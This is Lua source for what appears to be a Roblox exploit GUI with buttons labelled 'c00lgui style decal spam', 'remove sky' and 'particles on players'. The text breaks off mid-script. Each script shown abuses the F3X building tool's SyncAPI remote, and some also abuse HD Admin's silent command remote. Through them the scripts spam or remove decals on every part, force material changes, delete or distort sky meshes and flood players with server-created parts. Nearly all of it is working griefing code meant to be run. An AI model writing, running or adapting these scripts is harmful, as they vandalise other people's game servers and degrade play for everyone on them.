TextButton.Name = "TextButton"
TextButton.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton.Text = "c00lgui style decal spam"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 16
TextButton.TextWrapped = true
TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton.Position = UDim2.new(0.716038644, 0, -0.00842702761, 0)
TextButton.Size = UDim2.new(0, 75, 0, 43)
TextButton.Parent = R[36]

local LocalScript30 = Instance.new("Folder")
LocalScript30.Name = "LocalScript"
LocalScript30.Parent = TextButton
__S[#__S + 1] = function(...)
local script = LocalScript30
script.Parent.MouseButton1Click:Connect(function() 
    local id = script.Parent.Parent:FindFirstChild("skyid") and script.Parent.Parent.skyid.Text or "" 
    local player = game.Players.LocalPlayer 
    local char = player.Character 
    local tool 
    
    for i,v in player:GetDescendants() do 
        if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then 
            tool = v.Parent 
        end 
    end 
    
    if tool == nil then 
        for i,v in player:GetDescendants() do 
            if v.Name == "SyncAPI" then 
                tool = v.Parent 
            end 
        end 
    end 
    
    local remote = tool.SyncAPI.ServerEndpoint 
    
    local function _(args)
        return remote:InvokeServer(unpack(args))
    end

    local function SpawnDecal(part, side)
        local args = {
            [1] = "CreateTextures",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["Face"] = side,
                    ["TextureType"] = "Decal"
                }
            }
        }
        _(args)
    end

    local function AddDecal(part, asset, side)
        local args = {
            [1] = "SyncTexture",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["Face"] = side,
                    ["TextureType"] = "Decal",
                    ["Texture"] = "rbxassetid://" .. asset
                }
            }
        }
        _(args)
    end

    local function ClonePart(tbl, parent)
         local args = {
           [1] = "Clone",
           [2] = tbl,
           [3] = parent
        }
        _(args)
    end

    local function removetable(t)
        local args = { [1] = "Remove", [2] = {} }
        for _, v in pairs(t) do
            if v ~= nil and v:IsA("Decal") then
                table.insert(args[2], v)
           end
        end
        if #args[2] > 0 then
            _(args)
        end
    end

    local function GetPartsFromSelection(Selection) 
        local Parts = {} 
        for _, Descendant in pairs(Selection:GetDescendants()) do 
            if Descendant:IsA('BasePart') and Descendant.Name ~= "Terrain" and not tostring(Descendant.Name):find("Sky") then 
                Parts[#Parts + 1] = Descendant 
            end 
        end 
        return Parts 
    end 
    
    local function MakePartsVisibleAndPlastic() 
        task.defer(function() 
            local getfuckedlol = GetPartsFromSelection(workspace) 
            local shitass = {} 
            for _, Part in pairs(getfuckedlol) do 
                table.insert(shitass, { Part = Part, Transparency = 0, Material = Enum.Material.Plastic }) 
            end 
            remote:InvokeServer('SyncMaterial', shitass) 
        end) 
    end 
    
    local function exPro(root, decals)
        task.spawn(ClonePart, decals, root)
    end

    MakePartsVisibleAndPlastic() 

    local testpart = remote:InvokeServer("CreatePart", "Normal", CFrame.new(102938, 182939, 2928458), workspace.Terrain)
    local root = testpart 

    task.defer(function() SpawnDecal(root, Enum.NormalId.Front) end)
    task.defer(function() AddDecal(root, id, Enum.NormalId.Front) end)
    task.defer(function() SpawnDecal(root, Enum.NormalId.Back) end)
    task.defer(function() AddDecal(root, id, Enum.NormalId.Back) end)
    task.defer(function() SpawnDecal(root, Enum.NormalId.Right) end)
    task.defer(function() AddDecal(root, id, Enum.NormalId.Right) end)
    task.defer(function() SpawnDecal(root, Enum.NormalId.Left) end)
    task.defer(function() AddDecal(root, id, Enum.NormalId.Left) end)
    task.defer(function() SpawnDecal(root, Enum.NormalId.Bottom) end)
    task.defer(function() AddDecal(root, id, Enum.NormalId.Bottom) end)
    task.defer(function() SpawnDecal(root, Enum.NormalId.Top) end)
    task.defer(function() AddDecal(root, id, Enum.NormalId.Top) end)

    repeat task.wait() until root:FindFirstChildOfClass("Decal")

    local decals = {}
    for i, v in root:GetDescendants() do
        if v:IsA("Decal") then 
            table.insert(decals, v)
        end
    end

    local decalsintothevoid = {}
    for i, v in game.workspace:GetDescendants() do
        if v:IsA("Decal") then
            table.insert(decalsintothevoid, v)
        end
    end

    for i, v in game.workspace:GetDescendants() do
        if v:IsA("BasePart") and v.Name ~= "Sky" then
            task.defer(exPro, v, decals)
        end
    end 

    if #decalsintothevoid > 0 then
        task.spawn(removetable, decalsintothevoid)
    end
end)

end

local TextButton2 = Instance.new("TextButton")
TextButton2.Name = "TextButton"
TextButton2.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton2.Text = "remove sky"
TextButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton2.TextScaled = true
TextButton2.TextSize = 16
TextButton2.TextWrapped = true
TextButton2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton2.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton2.Position = UDim2.new(0.00102418847, 0, 0.550463855, 0)
TextButton2.Size = UDim2.new(0, 75, 0, 43)
TextButton2.Parent = R[36]

local LocalScript31 = Instance.new("Folder")
LocalScript31.Name = "LocalScript"
LocalScript31.Parent = TextButton2
__S[#__S + 1] = function(...)
local script = LocalScript31
script.Parent.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";time 15 ;unfog")

	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local backpack = player.Backpack

	local TARGET_MESH_ID = "rbxassetid://111891702759441"

	local function getf3x()
		for _, v in ipairs(backpack:GetChildren()) do
			if v:FindFirstChild("SyncAPI") then
				return v
			end
		end
		for _, v in ipairs(char:GetChildren()) do
			if v:FindFirstChild("SyncAPI") then
				return v
			end
		end
		return nil
	end

	local f3x = getf3x()
	if not f3x then
		warn("F3X tool not found.")
		return
	end

	local syncapi = f3x.SyncAPI
	local serverendpoint = syncapi.ServerEndpoint

	local function delete(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		serverendpoint:InvokeServer(unpack(args))
	end

	local function hasTargetMesh(part)
		if part:IsA("MeshPart") and part.MeshId == TARGET_MESH_ID then
			return true
		end

		for _, child in ipairs(part:GetChildren()) do
			if child:IsA("SpecialMesh") and child.MeshId == TARGET_MESH_ID then
				return true
			end
		end

		return false
	end

	local function deleteTargetParts()
		for _, v in ipairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				if hasTargetMesh(v) then
					task.spawn(function()
						delete(v)
					end)
				end
			end
		end
	end

	deleteTargetParts()

end)

end

local TextButton3 = Instance.new("TextButton")
TextButton3.Name = "TextButton"
TextButton3.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton3.Text = "remove decals"
TextButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton3.TextScaled = true
TextButton3.TextSize = 16
TextButton3.TextWrapped = true
TextButton3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton3.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton3.Position = UDim2.new(0.348750383, 0, 0.550145209, 0)
TextButton3.Size = UDim2.new(0, 75, 0, 43)
TextButton3.Parent = R[36]

local LocalScript32 = Instance.new("Folder")
LocalScript32.Name = "LocalScript"
LocalScript32.Parent = TextButton3
__S[#__S + 1] = function(...)
local script = LocalScript32
script.Parent.MouseButton1Click:Connect(function()
	local id = "0"

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
			tool = v.Parent
		end
	end
	if tool == nil then
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	end
	local remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		return remote:InvokeServer(unpack(args))
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end
	function ClonePart(table,parent)
		local args = {
			[1] ="Clone",
			[2] = table,
			[3] = parent
		}

		_(args)
	end
	function removetable(t)
		local args = { [1] = "Remove", [2] = {} }
		for _, v in pairs(t) do
			if v ~= nil and v:IsA("Decal") then
				table.insert(args[2],v)
			end
		end
		if #args[2] > 0 then
			_(args)
		end
	end

	local testpart = remote:InvokeServer("CreatePart","Normal",CFrame.new(102938,182939,2928458), workspace.Terrain)
	local root = testpart 
	task.defer(function()
		SpawnDecal(root,Enum.NormalId.Front)
	end)
	task.defer(function()
		AddDecal(root,id,Enum.NormalId.Front)
	end)
	task.defer(function()
		SpawnDecal(root,Enum.NormalId.Back)
	end)
	task.defer(function()
		AddDecal(root,id,Enum.NormalId.Back)
	end)
	task.defer(function()
		SpawnDecal(root,Enum.NormalId.Right)
	end)
	task.defer(function()
		AddDecal(root,id,Enum.NormalId.Right)
	end)
	task.defer(function()
		SpawnDecal(root,Enum.NormalId.Left)
	end)
	task.defer(function()
		AddDecal(root,id,Enum.NormalId.Left)
	end)
	task.defer(function()
		SpawnDecal(root,Enum.NormalId.Bottom)
	end)
	task.defer(function()
		AddDecal(root,id,Enum.NormalId.Bottom)
	end)
	task.defer(function()
		SpawnDecal(root,Enum.NormalId.Top)
	end)
	task.defer(function()
		AddDecal(root,id,Enum.NormalId.Top)
	end)
	repeat task.wait()until root:FindFirstChildOfClass("Decal")
	local decals = {}
	for i,v in root: GetDescendants()do
		if v:IsA"Decal"then 
			table.insert(decals,v)
		end
	end
	function exPro(root)
		task.spawn(ClonePart,decals,root)
	end



	local decalsintothevoid={}


	for i,v in game.workspace:GetDescendants() do
		if v:IsA("Decal")then
			table.insert(decalsintothevoid,v)--if any new decals destroy them
		end
	end
	function asdf()
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") and v.Name ~= "Sky" then
				task.defer(exPro,v)
			end
		end 
	end
	asdf()


	if #decalsintothevoid>0 then
		task.spawn(removetable,decalsintothevoid)
	end

end)
end

local TextButton4 = Instance.new("TextButton")
TextButton4.Name = "TextButton"
TextButton4.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton4.Text = "make sky small sky"
TextButton4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton4.TextScaled = true
TextButton4.TextSize = 16
TextButton4.TextWrapped = true
TextButton4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton4.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton4.Position = UDim2.new(0.718930244, 0, -0.59603256, 0)
TextButton4.Size = UDim2.new(0, 75, 0, 47)
TextButton4.Parent = R[36]

local LocalScript33 = Instance.new("Folder")
LocalScript33.Name = "LocalScript"
LocalScript33.Parent = TextButton4
__S[#__S + 1] = function(...)
local script = LocalScript33
script.Parent.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";time 0 ;fogcolor black ;fog 90000000")
	task.wait(0.01)

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool

	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	local remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function SetMesh(part, meshid, vertexColor)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid,
					["VertexColor"] = vertexColor or Vector3.new(1, 1, 1)
				}
			}
		}
		_(args)
	end

	function SetTexture(part, texid)
		local args = { [1] = "SyncMesh", [2] = { [1] = { ["Part"] = part, ["TextureId"] = "rbxassetid://"..texid } } }
		_(args)
	end

	table_insert = table.insert

	function MeshResize(part,size)
		local args = { [1] = "SyncMesh", [2] = { [1] = { ["Part"] = part, ["Scale"] = size } } }
		_(args)
	end

	function SetLocked(part,boolean)
		local args = { [1] = "SetLocked", [2] = { [1] = part }, [3] = boolean }
		_(args)
	end

	function SetTrans(part,int)
		local args = { [1] = "SyncMaterial", [2] = { [1] = { ["Part"] = part, ["Transparency"] = int } } }
		_(args)
	end

	function Color(part,color)
		local args = { [1] = "SyncColor", [2] = { [1] = { ["Part"] = part, ["Color"] = color, ["UnionColoring"] = false } } }
		_(args)
	end

	function SyncLighting(part,brightness)
		local args = { [1] = "SyncLighting", [2] = { [1] = { ["Part"] = part, ["LightType"] = "PointLight", ["Brightness"] = brightness } } }
		_(args)
	end

	function UpdateSkies()
		for i, v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.Name == "Sky" then
				local specialMesh = v:FindFirstChildOfClass("SpecialMesh")
				if specialMesh then
					local currentScale = specialMesh.Scale
					local currentTexture = specialMesh.TextureId:match("%d+") or ""
					local currentMeshId = specialMesh.MeshId:match("%d+") or "111891702759441"

					local targetScale
					local targetVertexColor
					local targetTransparency

					if currentScale.X >= 105000 then
						targetScale = Vector3.new(11000, 11000, 11000)
						targetVertexColor = Vector3.new(0, 0, 0)
						targetTransparency = 0
					elseif currentScale.X >= 90000 and currentScale.X <= 100000 then
						targetScale = Vector3.new(10000, 10000, 10000)
						targetVertexColor = Vector3.new(3.3, 3.3, 3.3)
						targetTransparency = 0.02
					end

					if targetScale then
						if currentTexture ~= "" then
							SetTexture(v, currentTexture)
						end

						SetMesh(v, currentMeshId, targetVertexColor)
						MeshResize(v, targetScale)
						SetLocked(v, true)
						SetTrans(v, targetTransparency)

						local matArgs = {
							[1] = "SyncMaterial",
							[2] = { [1] = { ["Part"] = v, ["Material"] = Enum.Material.Neon } }
						}
						_(matArgs)

						Color(v, Color3.fromRGB(255, 255, 255))
						SyncLighting(v, 0)
					end
				end
			end
		end
	end

	UpdateSkies()

end)
end

local TextButton5 = Instance.new("TextButton")
TextButton5.Name = "TextButton"
TextButton5.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton5.Text = "particles on players         (might lag)"
TextButton5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton5.TextScaled = true
TextButton5.TextSize = 16
TextButton5.TextWrapped = true
TextButton5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton5.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton5.Position = UDim2.new(0.716038644, 0, 0.549467683, 0)
TextButton5.Size = UDim2.new(0, 75, 0, 43)
TextButton5.Parent = R[36]

local LocalScript34 = Instance.new("Folder")
LocalScript34.Name = "LocalScript"
LocalScript34.Parent = TextButton5
__S[#__S + 1] = function(...)
local script = LocalScript34
script.Parent.MouseButton1Click:Connect(function()
local id = script.Parent.Parent:FindFirstChild("skyid") and script.Parent.Parent.skyid.Text or ""

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

local PARTICLE_TEXTURE = id
local PARTICLE_SIZE = Vector3.new(4, 4, 0.01)
local PARTICLES_PER_BURST = 5

local activeParticles = {}

local function spawnParticlesForPlayer(plr)
	local c = plr.Character
	if not c then return end
	local hum = c:FindFirstChildOfClass("Humanoid")
	local head = c:FindFirstChild("Head")
	if not (hum and head and hum.Health > 0) then return end

	for i = 1, PARTICLES_PER_BURST do
		local randomDirection = Vector3.new(
			math.random(-100, 100),
			math.random(-100, 100),
			math.random(-100, 100)
		).Unit

		local startCF = head.CFrame + Vector3.new(0, 2, 0)
		
		task.spawn(function()
			local p = remote:InvokeServer("CreatePart", "Normal", CFrame.new(10000, 10000, 10000), workspace)
			if not p then return end

			_({"SyncCollision", {{["Part"] = p, ["CanCollide"] = false}}})
			_({"SyncMaterial", {{["Part"] = p, ["Transparency"] = 0}}})
			_({"CreateMeshes", {{["Part"] = p}}})
			_({"SyncMesh", {{["Part"] = p, ["MeshId"] = "rbxassetid://111891702759441", ["TextureId"] = "rbxassetid://" .. PARTICLE_TEXTURE, ["Scale"] = PARTICLE_SIZE}}})
			_({"SyncResize", {{["Part"] = p, ["CFrame"] = startCF, ["Size"] = PARTICLE_SIZE}}})

			table.insert(activeParticles, {
				Part = p,
				CurrentPos = startCF.Position,
				Direction = randomDirection,
				Speed = 1.5,
				Life = 30
			})
		end)
	end
end

task.spawn(function()
	while true do
		task.wait(0.05)
		if #activeParticles == 0 then continue end

		local resizeBatch = {}
		local removeBatch = {}
		local remainingParticles = {}

		for _, data in ipairs(activeParticles) do
			if data.Part and data.Part.Parent and data.Life > 0 then
				data.CurrentPos = data.CurrentPos + (data.Direction * data.Speed)
				data.Life = data.Life - 1

				table.insert(resizeBatch, {
					["Part"] = data.Part,
					["CFrame"] = CFrame.new(data.CurrentPos),
					["Size"] = PARTICLE_SIZE
				})
				table.insert(remainingParticles, data)
			else
				if data.Part then
					table.insert(removeBatch, data.Part)
				end
			end
		end

		activeParticles = remainingParticles

		if #resizeBatch > 0 then
			task.spawn(function()
				_({"SyncResize", resizeBatch})
			end)
		end

		if #removeBatch > 0 then
			task.spawn(function()
				_({"Remove", removeBatch})
			end)
		end
	end
end)

task.spawn(function()
	while true do
		task.wait(0.4)
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr.Parent then
				spawnParticlesForPlayer(plr)
			end
		end
	end
end)

end)

end

local TextButton6 = Instance.new("TextButton")
TextButton6.Name = "TextButton"
TextButton6.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton6.Text = "angira249's particle script"
TextButton6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton6.TextScaled = true
TextButton6.TextSize = 16
TextButton6.TextWrapped = true
TextButton6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton6.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton6.Position = UDim2.new(1.07101703, 0, -0.597900689, 0)
TextButton6.Size = UDim2.new(0, 75, 0, 47)
TextButton6.Parent = R[36]

local LocalScript35 = Instance.new("Folder")
LocalScript35.Name = "LocalScript"
LocalScript35.Parent = TextButton6
__S[#__S + 1] = function(...)
local script = LocalScript35
script.Parent.MouseButton1Click:Connect(function()
local id = script.Parent.Parent:FindFirstChild("skyid") and script.Parent.Parent.skyid.Text or ""

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
		tool = v.Parent
	end
end
if tool == nil then
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
end
if not tool then return end

local remote = tool.SyncAPI.ServerEndpoint

local function _(args)
	remote:InvokeServer(unpack(args))
end

local PARTICLE_TEXTURE = id
local PARTICLE_SIZE = Vector3.new(4, 4, 0.01)

local activeParticles = {}

local function spawnParticle(head)
	local startCF = head.CFrame + Vector3.new(0, 3, 0)
	
	task.spawn(function()
		local p = remote:InvokeServer("CreatePart", "Normal", CFrame.new(10000, 10000, 10000), workspace)
		if not p then return end

		_({"SyncCollision", {{["Part"] = p, ["CanCollide"] = false}}})
		_({"SyncMaterial", {{["Part"] = p, ["Transparency"] = 0}}})
		_({"CreateMeshes", {{["Part"] = p}}})
		_({"SyncMesh", {{["Part"] = p, ["MeshId"] = "rbxassetid://111891702759441", ["TextureId"] = "rbxassetid://" .. PARTICLE_TEXTURE, ["Scale"] = PARTICLE_SIZE}}})
		_({"SyncResize", {{["Part"] = p, ["CFrame"] = startCF, ["Size"] = PARTICLE_SIZE}}})

		table.insert(activeParticles, {
			Part = p,
			BaseY = startCF.Position.Y,
			Head = head,
			Iteration = 1,
			MaxIterations = 40
		})
	end)
end

task.spawn(function()
	while true do
		task.wait(0.08)
		if #activeParticles == 0 then continue end

		local resizeBatch = {}
		local removeBatch = {}
		local remainingParticles = {}

		for _, data in ipairs(activeParticles) do
			if data.Part and data.Part.Parent and data.Head and data.Head.Parent and data.Iteration <= data.MaxIterations then
				
				table.insert(resizeBatch, {
					["Part"] = data.Part,
					["CFrame"] = CFrame.new(
						data.Head.Position.X,
						data.BaseY + (data.Iteration * 1.2),
						data.Head.Position.Z
					),
					["Size"] = PARTICLE_SIZE
				})
				
				data.Iteration = data.Iteration + 1
				table.insert(remainingParticles, data)
			else
				if data.Part then
					table.insert(removeBatch, data.Part)
				end
			end
		end

		activeParticles = remainingParticles

		if #resizeBatch > 0 then
			task.spawn(function()
				_({"SyncResize", resizeBatch})
			end)
		end

		if #removeBatch > 0 then
			task.spawn(function()
				_({"Remove", removeBatch})
			end)
		end
	end
end)

local function particleLoop(plr)
	while plr.Parent do
		task.wait(0.5)
		local c = plr.Character
		if not c then continue end
		local hum = c:FindFirstChildOfClass("Humanoid")
		local head = c:FindFirstChild("Head")
		if hum and head and hum.Health > 0 then
			spawnParticle(head)
		end
	end
end

for _, plr in Players:GetPlayers() do
	task.spawn(particleLoop, plr)
end

end)

end

local TextLabel = Instance.new("TextLabel")
TextLabel.Name = "TextLabel"
TextLabel.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextLabel.Text = "-- selected decal --"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 22
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.707634985, 0, 0.0409207158, 0)
TextLabel.Size = UDim2.new(0, 114, 0, 18)
TextLabel.Parent = R[35]

local TextButton7 = Instance.new("TextButton")
TextButton7.Name = "TextButton"
TextButton7.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton7.Text = "make sky trippy"
TextButton7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton7.TextScaled = true
TextButton7.TextSize = 16
TextButton7.TextWrapped = true
TextButton7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton7.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton7.Position = UDim2.new(0.149616212, 0, 0.18557404, 0)
TextButton7.Size = UDim2.new(0, 75, 0, 43)
TextButton7.Parent = R[35]

local LocalScript36 = Instance.new("Folder")
LocalScript36.Name = "LocalScript"
LocalScript36.Parent = TextButton7
__S[#__S + 1] = function(...)
local script = LocalScript36
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage") 
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent 
RequestCommand:InvokeServer(";") 
task.wait(0.2) 

local Players = game:GetService("Players") 
local RunService = game:GetService("RunService") 
local player = Players.LocalPlayer 
local tool 

for _, obj in ipairs(player:GetDescendants()) do 
    if obj.Name == "SyncAPI" then 
        tool = obj.Parent 
        break 
    end 
end 

if not tool then 
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do 
        if obj.Name == "SyncAPI" then 
            tool = obj.Parent 
            break 
        end 
    end 
end 

if not tool then return end 

local SyncAPI = tool:WaitForChild("SyncAPI") 
local connection 

local function call(args) 
    SyncAPI:Invoke(unpack(args)) 
end 

local function Sky() 
    local targetingMeshId = "rbxassetid://111891702759441"
    local activeSkies = {}
    
    for _, obj in ipairs(workspace:GetDescendants()) do 
        if obj:IsA("BasePart") then
            local targetMesh = obj:FindFirstChildOfClass("SpecialMesh") or obj:FindFirstChildOfClass("FileMesh")
            if targetMesh and (targetMesh.MeshId == targetingMeshId or targetMesh.MeshId == "111891702759441") then
                table.insert(activeSkies, { 
                    part = obj, 
                    baseCF = obj.CFrame,
                    mesh = targetMesh
                })
            end
        end 
    end 
    
    if #activeSkies == 0 then return end
    
    local smallestSkyIndex = 1
    local smallestVolume = math.huge
    
    for i, skyData in ipairs(activeSkies) do
        local currentScale = skyData.mesh.Scale
        local volume = currentScale.X * currentScale.Y * currentScale.Z
        if volume < smallestVolume then
            smallestVolume = volume
            smallestSkyIndex = i
        end
    end
    
    local smallestSky = activeSkies[smallestSkyIndex]
    call({ "SyncMesh", {{ Part = smallestSky.part, Scale = Vector3.new(50000, 50000, 50000) }} })
    
    local rotX, rotY, rotZ = 0, 0, 0
    local hueTime = 0
    local speedX = math.rad(50) 
    local speedY = math.rad(50) 
    local speedZ = math.rad(50) 
    
    connection = RunService.Heartbeat:Connect(function(dt) 
        local syncRotatePayload = {}
        local syncMeshPayload = {}
        local validSkiesExist = false
        
        rotX = (rotX + speedX * dt) % (math.pi * 2) 
        rotY = (rotY + speedY * dt) % (math.pi * 2) 
        rotZ = (rotZ + speedZ * dt) % (math.pi * 2) 
        
        hueTime = hueTime + dt * 2
        local wave = (math.sin(hueTime) + 1) / 2
        local sharedRotation = CFrame.Angles(rotX, rotY, rotZ)
        
        for i = #activeSkies, 1, -1 do
            local skyData = activeSkies[i]
            local targetPart = skyData.part
            
            if targetPart and targetPart.Parent then 
                validSkiesExist = true
                
                local nextCF = skyData.baseCF * sharedRotation
                table.insert(syncRotatePayload, { Part = targetPart, CFrame = nextCF })
                targetPart.CFrame = nextCF 
                
                local currentBaseSize = (i == smallestSkyIndex) and 50000 or 99999
                local dynamicScale = currentBaseSize + (wave * 20000)
                
                table.insert(syncMeshPayload, { 
                    Part = targetPart, 
                    Scale = Vector3.new(dynamicScale, dynamicScale, dynamicScale)
                })
            else
                table.remove(activeSkies, i)
            end
        end
        
        if not validSkiesExist then 
            if connection then 
                connection:Disconnect() 
                connection = nil 
            end 
            return 
        end 
        
        if #syncRotatePayload > 0 then
            call({ "SyncRotate", syncRotatePayload })
        end
        if #syncMeshPayload > 0 then
            call({ "SyncMesh", syncMeshPayload })
        end
    end) 
end 

Sky()

end)
end

local TextButton8 = Instance.new("TextButton")
TextButton8.Name = "TextButton"
TextButton8.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton8.Text = "make sky small trippy"
TextButton8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton8.TextScaled = true
TextButton8.TextSize = 16
TextButton8.TextWrapped = true
TextButton8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton8.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton8.Position = UDim2.new(0.00250261184, 0, 0.18557404, 0)
TextButton8.Size = UDim2.new(0, 75, 0, 43)
TextButton8.Parent = R[35]

local LocalScript37 = Instance.new("Folder")
LocalScript37.Name = "LocalScript"
LocalScript37.Parent = TextButton8
__S[#__S + 1] = function(...)
local script = LocalScript37
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage") 
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent 
RequestCommand:InvokeServer(";") 
task.wait(0.2) 

local Players = game:GetService("Players") 
local RunService = game:GetService("RunService") 
local player = Players.LocalPlayer 
local tool 

for _, obj in ipairs(player:GetDescendants()) do 
    if obj.Name == "SyncAPI" then 
        tool = obj.Parent 
        break 
    end 
end 

if not tool then 
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do 
        if obj.Name == "SyncAPI" then 
            tool = obj.Parent 
            break 
        end 
    end 
end 

if not tool then return end 

local SyncAPI = tool:WaitForChild("SyncAPI") 
local connection 

local function call(args) 
    SyncAPI:Invoke(unpack(args)) 
end 

local function Sky() 
    local targetingMeshId = "rbxassetid://111891702759441"
    local activeSkies = {}
    
    for _, obj in ipairs(workspace:GetDescendants()) do 
        if obj:IsA("BasePart") then
            local targetMesh = obj:FindFirstChildOfClass("SpecialMesh") or obj:FindFirstChildOfClass("FileMesh")
